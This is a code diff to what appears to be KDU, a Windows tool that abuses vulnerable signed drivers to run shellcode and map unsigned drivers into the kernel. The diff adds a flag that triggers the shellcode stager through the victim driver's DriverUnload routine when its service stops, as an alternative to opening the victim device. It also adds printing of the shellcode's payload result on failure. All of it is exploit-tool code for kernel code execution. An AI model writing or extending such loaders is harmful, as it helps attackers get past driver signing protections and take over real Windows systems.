@@ -20,6 +20,12 @@
 #include "global.h"
 
 static ULONG g_StagerOffset = 0; /* 显式 stager 落点，0 = 由 KDU 选择 */
+static BOOL g_UnloadTrigger = FALSE;  /* TRUE = 用 DriverUnload 触发，不打开设备 */
+
+VOID KDUSetUnloadTrigger(_In_ BOOL Enable)
+{
+    g_UnloadTrigger = Enable;
+}
 
 
 /*
@@ -771,9 +777,24 @@ BOOL KDUpMapDriverPhysicalTranslate(
         // Execute shellcode.
         //
         printf_s("[+] Executing shellcode\r\n");
-        VpExecutePayload(victimProv, &victimDeviceHandle);
-        if (victimDeviceHandle == NULL) {
-            supPrintfEvent(kduEventError, "[!] Victim device open failed, stager never invoked\r\n");
+
+        if (g_UnloadTrigger) {
+
+            /*
+             * 卸载触发：不依赖 victim 的设备。把 stager 挂在 DriverUnload 上，
+             * 停止驱动服务时内核就会调用它。
+             */
+            printf_s("[+] Triggering through victim DriverUnload (service stop)\r\n");
+            VpRelease(victimProv, NULL);
+        }
+        else {
+
+            VpExecutePayload(victimProv, &victimDeviceHandle);
+
+            if (victimDeviceHandle == NULL) {
+                supPrintfEvent(kduEventError,
+                    "[!] Victim device open failed, stager never invoked\r\n");
+            }
         }
 
         //
@@ -784,6 +805,8 @@ BOOL KDUpMapDriverPhysicalTranslate(
             supPrintfEvent(kduEventError,
                 "[!] Shellcode did not trigger the event within two seconds.\r\n");
 
+            printf_s("[!] Payload result as left by the shellcode:\r\n");
+            KDUShowPayloadResult(Context, ScSectionHandle);
         }
         else
         {
@@ -877,6 +900,8 @@ BOOL KDUpMapDriverPhysicalBruteForce(
 
             supPrintfEvent(kduEventError,
                 "[!] Shellcode did not trigger the event within two seconds.\r\n");
+            printf_s("[!] Payload result as left by the shellcode:\r\n");
+            KDUShowPayloadResult(Context, ScSectionHandle);
 
         }
         else
